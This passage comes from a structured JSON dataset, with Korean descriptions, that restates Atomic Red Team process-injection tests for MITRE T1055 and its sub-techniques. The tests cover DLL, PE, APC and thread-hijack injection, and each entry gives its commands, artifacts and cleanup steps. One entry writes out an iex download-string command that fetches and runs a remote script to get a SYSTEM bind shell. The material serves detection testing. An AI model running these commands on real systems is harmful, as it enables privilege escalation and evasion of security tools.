        "$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug 를 실행한다.",
        "프로그램은 OpenProcess로 핸들을 얻고, VirtualAllocEx로 원격 메모리를 할당한 뒤 WriteProcessMemory로 셸코드를 기록한다.",
        "VirtualProtectEx로 실행 권한을 부여하고, RtlCreateUserThread로 원격 스레드를 생성한다.",
        "CalculatorApp 및 #{spawn_process_name} 프로세스를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$process = Start-Process #{spawn_process_path} -passthru\r\n$PathToAtomicsFolder\\T1055\\bin\\x64\\RtlCreateUserThread.exe -pid $process.Id -debug"
        }
      ],
      "prerequisites": [
        "#{spawn_process_path} 경로의 바이너리를 실행할 수 있어야 한다(기본: C:\\Windows\\System32\\werfault.exe).",
        "RtlCreateUserThread.exe가 지정 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "#{spawn_process_name}",
            "description": "셸코드가 인젝션되는 타겟 프로세스(기본: werfault)"
          },
          {
            "name": "RtlCreateUserThread.exe",
            "description": "원격 프로세스에 셸코드를 인젝션하고 RtlCreateUserThread로 실행하는 인젝터"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 실행 결과로 생성되는 계산기 앱"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue"
      ],
      "metadata": {
        "atomic_source_id": "a0c1725f-abcd-40d6-baac-020f3cf94ecd"
      }
    },

    {
      "test_id": "T1055-9",
      "name": "Remote Process Injection with Go using CreateRemoteThread WinAPI",
      "platforms": ["windows"],
      "summary": "golang.org/x/sys/windows 패키지를 활용하여 OpenProcess/VirtualAllocEx/WriteProcessMemory/VirtualProtectEx/CreateRemoteThread로 원격 프로세스에 셸코드를 인젝션하고 실행.",
      "procedure": [
        "PowerShell에서 $process = Start-Process #{spawn_process_path} -passthru 명령으로 타겟 프로세스를 시작한다.",
        "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug 를 실행한다.",
        "프로그램은 Windows 패키지를 통해 필요한 API를 호출하여 셸코드를 원격 프로세스 메모리에 기록하고 CreateRemoteThread로 실행한다.",
        "CalculatorApp와 #{spawn_process_name} 프로세스를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$process = Start-Process #{spawn_process_path} -passthru\r\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug"
        }
      ],
      "prerequisites": [
        "#{spawn_process_path}가 유효한 실행 파일이어야 한다.",
        "CreateRemoteThread.exe가 지정 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "#{spawn_process_name}",
            "description": "셸코드 인젝션 대상 프로세스(기본: werfault)"
          },
          {
            "name": "CreateRemoteThread.exe",
            "description": "CreateRemoteThread 기반 원격 인젝션 PoC"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue"
      ],
      "metadata": {
        "atomic_source_id": "69534efc-d5f5-4550-89e6-12c6457b9edd"
      }
    },

    {
      "test_id": "T1055-10",
      "name": "Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively)",
      "platforms": ["windows"],
      "summary": "Kernel32.dll을 직접 로드해 CreateRemoteThread 등 API 주소를 얻고, VirtualAllocEx/WriteProcessMemory/VirtualProtectEx/CreateRemoteThread로 원격 프로세스에 셸코드를 인젝션하는 네이티브 방식.",
      "procedure": [
        "PowerShell에서 $process = Start-Process #{spawn_process_path} -passthru 명령으로 타겟 프로세스를 시작한다.",
        "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug 를 실행한다.",
        "프로그램은 LoadLibrary/GetProcAddress를 통해 Kernel32.dll의 함수 포인터를 직접 구해 인젝션 플로우를 수행한다.",
        "CalculatorApp 실행 여부와 #{spawn_process_name} 상태를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$process = Start-Process #{spawn_process_path} -passthru\r\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThreadNative.exe -pid $process.Id -debug"
        }
      ],
      "prerequisites": [
        "CreateRemoteThreadNative.exe가 지정 경로에 존재해야 한다.",
        "#{spawn_process_path}가 유효해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "#{spawn_process_name}",
            "description": "네이티브 CreateRemoteThread 기반 인젝션 대상 프로세스"
          },
          {
            "name": "CreateRemoteThreadNative.exe",
            "description": "Kernel32 함수를 직접 로딩하는 네이티브 인젝션 PoC"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue",
        "Stop-Process -Name #{spawn_process_name} -ErrorAction SilentlyContinue"
      ],
      "metadata": {
        "atomic_source_id": "2a4ab5c1-97ad-4d6d-b5d3-13f3a6c94e39"
      }
    },

    {
      "test_id": "T1055-11",
      "name": "Process Injection with Go using CreateThread WinAPI",
      "platforms": ["windows"],
      "summary": "현재 프로세스 내 VirtualAlloc/RtlCopyMemory/VirtualProtect/CreateThread/WaitForSingleObject 콜을 이용해 셸코드를 로컬 인젝션 방식으로 실행.",
      "procedure": [
        "PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug 를 실행한다.",
        "프로그램은 VirtualAlloc로 RW 메모리를 확보하고, RtlCopyMemory로 셸코드를 복사한다.",
        "VirtualProtect로 페이지 권한을 RX로 변경한 뒤, CreateThread로 새로운 스레드를 생성하고 WaitForSingleObject로 종료를 대기한다.",
        "CalculatorApp가 실행되는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThread.exe -debug"
        }
      ],
      "prerequisites": [
        "CreateThread.exe가 지정 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "CreateThread.exe",
            "description": "로컬 프로세스 내 CreateThread 기반 셸코드 실행 PoC"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 실행 결과로 열리는 계산기 앱"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      ],
      "metadata": {
        "atomic_source_id": "2871ed59-3837-4a52-9107-99500ebc87cb"
      }
    },

    {
      "test_id": "T1055-12",
      "name": "Process Injection with Go using CreateThread WinAPI (Natively)",
      "platforms": ["windows"],
      "summary": "CreateThread/VirtualAlloc/VirtualProtect/RtlCopyMemory 등을 직접 DLL 로딩/함수 포인터 획득 방식으로 호출하여 현재 프로세스 내 셸코드를 실행하는 네이티브 CreateThread 인젝션.",
      "procedure": [
        "PowerShell에서 $PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug 를 실행한다.",
        "프로그램은 ntdll/kernel32 등을 직접 로딩해 필요한 API 주소를 획득한 뒤, 셸코드를 메모리에 복사하고 CreateThread로 실행한다.",
        "CalculatorApp가 실행되는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug"
        }
      ],
      "prerequisites": [
        "CreateThreadNative.exe가 지정 경로에 존재해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "CreateThreadNative.exe",
            "description": "네이티브 방식으로 CreateThread를 호출해 셸코드를 실행하는 인젝터"
          },
          {
            "name": "CalculatorApp",
            "description": "셸코드 실행 결과로 열리는 계산기 앱"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
      ],
      "metadata": {
        "atomic_source_id": "2a3c7035-d14f-467a-af94-933e49fe6786"
      }
    },

    {
      "test_id": "T1055-13",
      "name": "UUID custom process Injection",
      "platforms": ["windows"],
      "summary": "NCC Group의 UUID 인젝션 아이디어를 확장한 기법으로, 셸코드를 UUID 형태로 힙에 저장하고 커스텀 UUID 변환 함수와 EnumSystemLocalesA만을 이용해 실행하는 PoC(uuid_injection.exe).",
      "procedure": [
        "#{exe_binary} 경로에 uuid_injection.exe가 존재하는지 확인하고, 없으면 GitHub에서 다운로드한다.",
        "PowerShell에서 Start-Process \"#{exe_binary}\" 를 실행하여 PoC를 시작한다.",
        "프로그램은 커스텀 UuidToString/UuidFromString 구현을 사용해 UUID 문자열을 바이너리 셸코드로 변환하고 힙에 적재한다.",
        "EnumSystemLocalesA API를 사용해 셸코드 주소를 콜백으로 호출하여 실행한다.",
        "셸코드 실행 결과로 메시지 박스와 notepad가 열리는지 확인한다.",
        "7초 후 Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 로 notepad를 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Start-Process \"#{exe_binary}\"\r\nStart-Sleep -Seconds 7\r\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
        }
      ],
      "prerequisites": [
        "#{exe_binary} 경로에 uuid_injection.exe가 존재해야 한다(없으면 get_prereq로 다운로드).",
        "notepad.exe 실행이 차단되어 있지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{exe_binary}",
            "description": "UUID 기반 커스텀 인젝션 PoC 바이너리"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "uuid_injection.exe",
            "description": "UUID 문자열을 통해 셸코드를 복원하고 EnumSystemLocalesA로 실행하는 인젝터"
          },
          {
            "name": "notepad.exe",
            "description": "셸코드 실행 결과로 실행되는 예시 프로세스"
          }
        ],
        "network": []
      },
      "cleanup": [
        "Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 명령으로 notepad를 종료한다."
      ],
      "metadata": {
        "atomic_source_id": "0128e48e-8c1a-433a-a11a-a5304734f1e1"
      }
    }
  ]
},{
  "technique_id": "T1055.001",
  "technique_name": "Process Injection: Dynamic-link Library Injection",
  "tactic": "Defense Evasion",
  "description": "공격자는 정상 프로세스에 악성 DLL을 주입(DLL Injection)하여 해당 프로세스 컨텍스트로 코드를 실행한다. 이는 프로세스 위장, EDR 우회, 권한 상승 등에 활용되며, mavinject.exe 같은 정식 유틸리티나 특정 서비스의 DLL 로드 동작(UsoClient 등)을 악용할 수 있다.",

  "tests": [
    {
      "test_id": "T1055.001-1",
      "name": "Process Injection via mavinject.exe",
      "platforms": ["windows"],
      "summary": "공식 Windows 유틸리티인 mavinject.exe를 이용해, 실행 중인 프로세스(기본: notepad)에 T1055.001.dll을 인젝션하는 DLL Injection 시나리오.",
      "procedure": [
        "1) PowerShell에서 테스트용 DLL 경로 #{dll_payload}가 존재하는지 확인한다.",
        "   - 존재하지 않으면 get_prereq가 GitHub에서 T1055.001.dll을 다운로드하여 #{dll_payload} 위치에 저장한다.",
        "2) PowerShell에서 대상 프로세스를 시작하고 PID를 확보한다.",
        "   - 기본값: #{process_id} → (Start-Process notepad -PassThru).Id 로 notepad.exe를 실행하고 PID를 반환.",
        "3) mavinject.exe를 사용하여 대상 프로세스에 DLL을 인젝션한다.",
        "   - $mypid = #{process_id}",
        "   - mavinject $mypid /INJECTRUNNING \"#{dll_payload}\"",
        "4) 인젝션 결과로 notepad 아이콘이 보이는 메시지 박스가 나타나는지 확인한다.",
        "5) 테스트 종료 후 Stop-Process -processname notepad 명령으로 notepad를 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$mypid = #{process_id}\r\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\r\nStop-Process -processname notepad"
        }
      ],
      "prerequisites": [
        "#{dll_payload} 경로에 T1055.001.dll 파일이 존재해야 한다.",
        "get_prereq 명령은 GitHub에서 T1055.001.dll을 내려받아 지정 폴더에 생성한다.",
        "테스트 환경에 mavinject.exe(Windows 10 UWP 관련 유틸리티)가 존재해야 한다.",
        "notepad.exe 실행이 차단되어 있지 않아야 하며, DLL 인젝션을 실행할 권한(보통 관리자 권한)이 필요하다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{dll_payload}",
            "description": "GitHub에서 다운로드한 DLL 페이로드(T1055.001.dll)"
          }
        ],
        "files_read": [
          {
            "path": "#{dll_payload}",
            "description": "mavinject.exe가 대상 프로세스에 로드하는 DLL 페이로드"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "notepad.exe",
            "description": "DLL이 인젝션되는 대상 프로세스"
          },
          {
            "name": "mavinject.exe",
            "description": "Microsoft 정식 유틸리티로, /INJECTRUNNING 옵션을 이용해 실행 중 프로세스에 DLL을 주입"
          },
          {
            "name": "powershell.exe",
            "description": "DLL 다운로드 및 mavinject 호출을 수행하는 스크립트 호스트"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "get_prereq 단계에서 GitHub로부터 T1055.001.dll을 다운로드하는 트래픽 (원격 URL 기반)"
          }
        ]
      },
      "cleanup": [
        "Stop-Process -processname notepad 를 통해 notepad 프로세스를 종료한다.",
        "테스트 전용으로 다운로드한 #{dll_payload} (T1055.001.dll)를 삭제한다.",
        "mavinject 실행 로그 및 PowerShell 히스토리가 탐지 분석에 사용될 수 있으므로, 실험 후에는 적절히 보존 또는 정리 정책을 따른다."
      ],
      "metadata": {
        "atomic_source_id": "74496461-11a1-4982-b439-4d87a550d254"
      }
    },

    {
      "test_id": "T1055.001-2",
      "name": "WinPwn - Get SYSTEM shell via UsoClient DLL load technique",
      "platforms": ["windows"],
      "summary": "WinPwn 스크립트(Get-UsoClientDLLSystem.ps1)를 이용해 UsoClient의 DLL 로드 동작을 악용, SYSTEM 권한 쉘을 바인드하는 DLL 로드/인젝션 기반 LPE 시나리오.",
      "procedure": [
        "1) PowerShell을 관리자 권한으로 실행한다(권장).",
        "2) 아래 명령을 실행해 GitHub에 호스팅된 Get-UsoClientDLLSystem.ps1를 메모리로 다운로드 후 즉시 실행한다.",
        "   - iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
        "3) 스크립트는 UsoClient의 DLL 로드 메커니즘을 악용하여 DLL 로딩 경로를 하이재킹(hijack)하고, SYSTEM 권한을 가진 바인드 쉘(또는 지정된 페이로드)을 생성하려 시도한다.",
        "4) 성공 시, SYSTEM 권한 컨텍스트에서 명령 실행 혹은 바인드된 포트로 접속이 가능해진다(스크립트 옵션에 따라 상이)."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')"
        }
      ],
      "prerequisites": [
        "인터넷 연결이 가능해야 하며, GitHub 접근이 차단되지 않아야 한다.",
        "PowerShell 스크립트 실행 정책이 원격 스크립트 실행을 허용해야 한다(또는 Bypass/Unrestricted 등으로 실행).",
        "시스템에 UsoClient 및 관련 서비스가 존재하고 정상 동작 중이어야 한다.",
        "SYSTEM 권한 획득을 위한 LPE 실험이므로, 실험 환경(랩/가상머신)에서만 수행해야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "원격 스크립트를 다운로드 및 실행하여 DLL 로드 기법을 수행하는 프로세스"
          },
          {
            "name": "UsoClient 관련 프로세스",
            "description": "DLL 로드 경로를 하이재킹되어 악성 DLL이 로드될 수 있는 대상 프로세스"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "GitHub 저장소 'Get-System-Techniques'에서 Get-UsoClientDLLSystem.ps1를 다운로드하는 트래픽"
          }
        ]
      },
      "cleanup": [
        "테스트 중 생성된 임시 DLL·스크립트 파일이 있다면, 스크립트 문서를 참고해 삭제한다.",
        "UsoClient DLL 경로/레지스트리 설정이 변경되었을 수 있으므로, 원래 값으로 복원했는지 확인한다.",
        "시스템에 남은 SYSTEM 바인드 쉘/리스너가 있다면 종료하고, 관련 방화벽 규칙을 원복한다."
      ],
      "metadata": {
        "atomic_source_id": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5"
      }
    }
  ]
},
{
  "technique_id": "T1055.002",
  "technique_name": "Process Injection: Portable Executable Injection",
  "tactic": "Defense Evasion",
  "description": "공격자는 다른 프로세스의 메모리에 전체 PE(Portable Executable)를 직접 적재하고, 재배치(Base Address Relocation)와 진입점 설정을 통해 그대로 실행시키는 기법을 사용한다. 이 방식은 단순 쉘코드 인젝션보다 구조가 복잡하지만, 완전한 실행 파일을 숨겨서 실행할 수 있어 탐지와 분석을 더 어렵게 만든다.",

  "tests": [
    {
      "test_id": "T1055.002-1",
      "name": "Portable Executable Injection (RedInjection.exe → Notepad)",
      "platforms": ["windows"],
      "summary": "RedInjection.exe를 이용해 원격 notepad 프로세스 메모리에 PE를 인젝션하고, 재배치를 거쳐 실행시키는 시나리오. 성공 시 몇 초 후 \"Warning\" 제목, \"Atomic Red Team\" 내용의 메시지 박스가 표시된다.",
      "procedure": [
        "1) 사전 준비 단계 (get_prereq):",
        "   - 입력 인자 #{exe_binary} 경로에 PE 바이너리(RedInjection.exe)가 존재하는지 확인한다.",
        "   - 존재하지 않는 경우:",
        "     · (split-path \"#{exe_binary}\") 경로에 디렉토리를 생성한다.",
        "     · Invoke-WebRequest로 GitHub에서 RedInjection.exe를 다운로드하여 #{exe_binary} 경로에 저장한다.",
        "",
        "2) 인젝션 실행:",
        "   - PowerShell에서 Start-Process \"#{exe_binary}\" 를 실행한다.",
        "   - RedInjection.exe는 내부적으로 다음과 같은 동작을 수행하는 PE 인젝터 역할을 한다고 가정할 수 있다:",
        "     · 대상 프로세스(notepad.exe)를 생성하거나, 이미 실행 중인 notepad 프로세스를 찾는다.",
        "     · 대상 프로세스 메모리 영역에 PE 이미지를 할당하고, 섹션 매핑 및 재배치(Base Relocation)를 적용한다.",
        "     · IAT(Import Address Table) 해결 및 초기화 코드를 수행한다.",
        "     · PE의 EntryPoint로 스레드를 시작하여 코드를 실행한다.",
        "   - 성공적으로 인젝션 및 실행이 완료되면, 약간의 지연 후 \"Warning\"이라는 제목과 \"Atomic Red Team\"이라는 내용을 가진 메시지 박스가 나타난다.",
        "",
        "3) 테스트 대기 및 종료:",
        "   - Start-Sleep -Seconds 7 명령으로 7초 동안 대기하여 메시지 박스 및 인젝션 결과를 확인할 수 있도록 한다.",
        "   - 이후 Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 를 통해 notepad 프로세스를 강제 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Start-Process \"#{exe_binary}\"\r\nStart-Sleep -Seconds 7\r\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force"
        }
      ],
      "prerequisites": [
        "테스트용 PE 인젝터 바이너리(#{exe_binary}, 기본값: PathToAtomicsFolder\\T1055.002\\bin\\RedInjection.exe)가 존재해야 한다.",
        "get_prereq 단계에서 GitHub 저장소(atomic-red-team)에서 RedInjection.exe를 내려받아 해당 경로에 저장한다.",
        "Windows 환경에서 PowerShell이 실행 가능해야 하고, 인터넷을 통해 GitHub에 접근 가능해야 한다.",
        "notepad.exe 실행이 정책/백신에 의해 완전히 차단되어 있지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{exe_binary}",
            "description": "GitHub에서 다운로드한 PE 인젝션 도구 RedInjection.exe"
          }
        ],
        "files_read": [
          {
            "path": "#{exe_binary}",
            "description": "PowerShell Start-Process에 의해 실행되는 PE 인젝터 바이너리"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "RedInjection.exe",
            "description": "포터블 실행 파일(PE)을 타 프로세스 메모리에 매핑·재배치하여 실행하는 인젝션 도구"
          },
          {
            "name": "notepad.exe",
            "description": "PE 인젝션의 타깃 프로세스. 인젝션 성공 후 메시지 박스를 표시하는 코드가 이 프로세스 컨텍스트에서 실행됨."
          },
          {
            "name": "powershell.exe",
            "description": "RedInjection.exe 실행 및 사후 정리를 수행하는 스크립트 호스트"
          }
        ],
        "network": [
          {
            "protocol": "HTTPS",
            "description": "get_prereq 단계에서 GitHub(atomic-red-team 저장소)에서 RedInjection.exe를 다운로드하는 트래픽"
          }
        ]
      },
      "cleanup": [
        "PowerShell에서 Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force 로 notepad 프로세스를 강제 종료한다.",
        "실험 환경 정리를 위해 필요 시 #{exe_binary}(RedInjection.exe)를 삭제한다.",
        "인젝션 테스트가 남긴 보안 로그(Event Log), EDR 탐지 로그 등은 포렌식/탐지 튜닝에 활용하고, 실험 후에는 조직 정책에 따라 보존 또는 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "578025d5-faa9-4f6d-8390-aae739d503e1"
      }
    }
  ]
},
{
  "technique_id": "T1055.003",
  "technique_name": "Thread Execution Hijacking",
  "tactic": "Defense Evasion",
  "description": "공격자는 이미 실행 중인 스레드의 실행 흐름(EIP/RIP, 컨텍스트)을 탈취해 악성 코드를 실행하는 기법을 사용한다. 정상 프로세스/스레드를 재사용하기 때문에 신규 프로세스 생성 없이 코드 실행이 가능하며, 보안 제품이 프로세스 기준으로만 행위를 감시할 경우 탐지가 어려워질 수 있다. 주로 인증 정보 탈취, 셸코드 실행, 지속성 유지 등 목적으로 악용된다.",

  "tests": [
    {
      "test_id": "T1055.003-1",
      "name": "Thread Execution Hijacking in Notepad via InjectContext.exe",
      "platforms": ["windows"],
      "summary": "notepad.exe를 시작한 뒤, InjectContext.exe를 사용해 해당 프로세스의 스레드 실행 흐름을 하이재킹하는 시나리오이다. 성공 시 1~2초 후 \"Atomic Red Team\" 캡션을 가진 MessageBox가 표시되며, 이후 notepad 프로세스를 종료한다.",
      "procedure": [
        "1) 대상 프로세스 시작:",
        "   - $notepad = Start-Process notepad -PassThru",
        "   - PowerShell에서 notepad.exe를 새로 실행하고, -PassThru 옵션으로 프로세스 객체(특히 PID)를 변수 $notepad에 저장한다.",
        "",
        "2) 스레드 실행 하이재킹 수행:",
        "   - Start-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"",
        "   - InjectContext.exe는 내부적으로 다음과 유사한 단계를 수행하는 스레드 하이재킹 인젝터 역할을 한다고 볼 수 있다:",
        "     · 대상 프로세스(notepad)의 핸들을 열고, 해당 프로세스 내 스레드 중 하나의 핸들을 획득한다.",
        "     · 대상 프로세스에 셸코드(MessageBox를 띄우는 msfvenom 기반 셸코드)를 위한 메모리 공간을 할당하고, 셸코드를 기록한다.",
        "     · GetThreadContext/SetThreadContext 등의 API를 사용해 대상 스레드의 레지스터(특히 명령 포인터)를 셸코드 시작 주소로 변경한다.",
        "     · 스레드를 재개/계속 실행시켜, 기존 정상 코드 대신 셸코드가 실행되도록 한다.",
        "   - 인젝션 및 스레드 하이재킹이 성공하면, 1~2초 내에 \"Atomic Red Team\" 캡션을 가진 MessageBox가 notepad 컨텍스트에서 표시된다.",
        "",
        "3) 대기 및 정리:",
        "   - Start-Sleep -Seconds 5 로 5초간 대기하여 MessageBox 표시와 스레드 실행 결과를 확인할 수 있도록 한다.",
        "   - 이후 Stop-Process $notepad.Id 로 notepad 프로세스를 강제 종료하여 실험을 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$notepad = Start-Process notepad -passthru\r\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\r\nStart-Sleep -Seconds 5\r\nStop-Process $notepad.id"
        }
      ],
      "prerequisites": [
        "테스트용 인젝션 바이너리 InjectContext.exe가 $PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe 경로에 존재해야 한다.",
        "Windows 환경에서 PowerShell을 사용할 수 있어야 한다.",
        "notepad.exe 실행이 보안 정책 또는 백신에 의해 전면 차단되어 있지 않아야 한다.",
        "필요 시 사전에 수동 또는 별도 스크립트로 InjectContext.exe 파일을 해당 경로에 배치해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe",
            "description": "Thread Execution Hijacking을 수행하는 인젝션 도구 (실험 환경에 사전 배포 필요)"
          }
        ],
        "files_read": [
          {
            "path": "$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe",
            "description": "PowerShell Start-Process에 의해 실행되는 스레드 하이재킹 인젝터 바이너리"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "notepad.exe",
            "description": "스레드 실행 하이재킹의 대상 프로세스. 내부 스레드가 셸코드로 리다이렉트되어 MessageBox를 표시함."
          },
          {
            "name": "InjectContext.exe",
            "description": "notepad 프로세스의 스레드를 대상으로 컨텍스트(레지스터)를 수정해 셸코드를 실행시키는 인젝션 도구."
          },
          {
            "name": "powershell.exe",
            "description": "테스트 전체를 오케스트레이션하는 스크립트 실행 호스트."
          }
        ],
        "network": []
      },
      "cleanup": [
        "PowerShell에서 Stop-Process $notepad.Id 로 notepad 프로세스를 강제 종료하여 인젝션 대상 프로세스를 정리한다.",
        "필요시 $PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe 파일을 삭제하여 도구 흔적을 제거한다.",
        "실험으로 인해 생성된 보안 로그(Event Log, EDR 알림 등)는 탐지 규칙/튜닝에 활용한 후, 조직 정책에 따라 보존 또는 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "578025d5-faa9-4f6d-8390-aae527d503e1"
      }
    }
  ]
},
{
  "technique_id": "T1055.004",
  "technique_name": "Process Injection: Asynchronous Procedure Call (APC)",
  "tactic": "Defense Evasion",
  "description": "APC(Process의 비동기 프로시저 호출) 메커니즘을 악용해 다른 프로세스/스레드의 실행 흐름에 악성 코드를 끼워 넣는 기법이다. 공격자는 QueueUserAPC, NtQueueApcThreadEx 등의 API를 사용해 특정 스레드가 alertable 상태가 되었을 때 셸코드가 실행되도록 등록할 수 있으며, 정상 프로세스 컨텍스트 내에서 실행되기 때문에 탐지 회피에 활용된다.",

  "tests": [
    {
      "test_id": "T1055.004-1",
      "name": "Process Injection via C# (T1055.exe, 다중 기법 포함)",
      "platforms": ["windows"],
      "summary": "C# 기반 인젝션 도구(T1055.exe)를 실행해 5가지 메모리 인젝션 기법(일반 프로세스 인젝션, ApcInjectionAnyProcess, ApcInjectionNewProcess, IAT Injection, ThreadHijack)을 한 번에 연습하는 시나리오.",
      "procedure": [
        "1) 사전 준비:",
        "   - PE 바이너리 T1055.exe가 다음 경로에 존재해야 한다:",
        "     · PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe",
        "   - 존재하지 않을 경우, Atomic Red Team 레포에서 해당 exe를 다운로드하는 PowerShell 의존성 단계로 파일을 준비한다.",
        "",
        "2) 인젝션 도구 실행:",
        "   - cmd.exe 또는 PowerShell에서 다음 명령이 실행된다:",
        "     · \"PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe\"",
        "   - 이 실행 파일은 내부적으로 다음과 같은 C# 기반 메모리 인젝션 기술들을 순차적으로 또는 옵션에 따라 수행한다:",
        "     1) Process injection: 대상 프로세스를 열고 메모리 할당 → 셸코드/PE 쓰기 → 원격 스레드 생성",
        "     2) ApcInjectionAnyProcess: 이미 실행 중인 프로세스의 alertable 상태 스레드에 QueueUserAPC를 사용해 셸코드 주소를 등록",
        "     3) ApcInjectionNewProcess: 새 프로세스를 생성(suspended/alertable) 후 QueueUserAPC를 이용해 조기(Early) 코드 실행",
        "     4) IAT Injection: Import Address Table에 후킹/패치 후 특정 API 호출 시 공격자 코드가 먼저 실행되도록 조작",
        "     5) ThreadHijack: 기존 스레드 컨텍스트를 변경해 셸코드를 실행시키는 스레드 하이재킹",
        "",
        "3) 결과 확인:",
        "   - 콘솔(stdout)에 각 기법 수행 단계 및 상태 메시지가 출력된다.",
        "   - 특정 기법의 경우, 메시지 박스나 calc.exe/notepad.exe 등 테스트용 프로세스가 생성될 수 있다(실제 구현에 따라 상이).",
        "",
        "4) 실험 종료:",
        "   - T1055.exe 프로세스와, 테스트 중 생성된 calc.exe / notepad.exe / 샘플 대상 프로세스들을 수동 또는 후속 스크립트로 종료해 정리한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"#{exe_binary}\""
        }
      ],
      "prerequisites": [
        "T1055.exe 파일이 PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe 경로에 존재해야 한다.",
        "존재하지 않는 경우, get_prereq_command 단계에서 GitHub(redcanaryco/atomic-red-team)에서 exe를 다운로드해 저장한다.",
        "Windows 환경에서 cmd.exe 또는 PowerShell을 사용할 수 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe",
            "description": "C# 기반 메모리 인젝션/ APC 인젝션 테스트용 PE 바이너리"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe",
            "description": "명령 프롬프트에서 직접 실행되는 인젝션 도구"
          }
        ],
